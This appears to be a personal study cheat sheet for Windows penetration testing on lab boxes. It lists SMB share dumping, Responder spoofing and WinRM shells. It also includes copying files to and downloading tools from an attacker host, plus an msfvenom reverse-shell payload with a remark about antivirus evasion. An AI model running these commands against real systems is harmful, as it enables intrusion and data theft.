# Windows CheatSheet

## General

look for hostname in nmap results

smb is on ports 139 and 445, nmap doesnt really show that

```bash
smbclient -L $IP 
#lists all shares on smb

smbclient -N //$IP/sharename 
#connects to share as anon

smb: \> tar c all.tar 
#archives entire share and dumps on system

```

```bat
type <file>
::windows equivilent of cat

```

## Enumeration

```bash
sudo responder -wA -I tun0 -v #Spoofs every server imaginable to get info on connection attempts

```

## Shell

WinRM is usually on port 5985, look for Microsoft HTTPAPI httpd 2.0 service

```bash
evil-winrn -i $IP -u $USER 

```

## File Movement

(windows to kali)
```bash
#Start impacket-smbserver on kali box
sudo impacket-smbserver my_share -smb2support .

```

```bat
::Run command on windows box
copy <filename> \\10.10.14.8\my_share\<filename>
```

(kali to windows)
```bat
Invoke-WebRequest -OutFile winpeas.bat -Uri 10.10.14.7:8000/winPEAS.bat
```

## PrivEsc

```bat
.\winPEASany.exe
::winpeas finds a whole lot of interesting things

.\Sherlock.ps1
::sherlock is old, but finds common CVEs
```
## Meterpreter

Staged means normal rev shell. OS/meterpreter/reverse_tcp is staged. It's much smaller, but much more fingerprinted and hard to bypass AV

Unstaged means special meterpreter shell. OS/meterpreter_reverse_tcp is unstaged. Pretty big (150+ KB) but can be obviscated much better

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=port -f <format> -o outfile.exe
#payload creation made easy :)

```

For privesc, search exploit/windows/local

## Web

https://github.com/samratashok/nishang - powershell goodies


## Box Specific:

Tomcat default - Jerry Box
SMBv1 - Blue Box
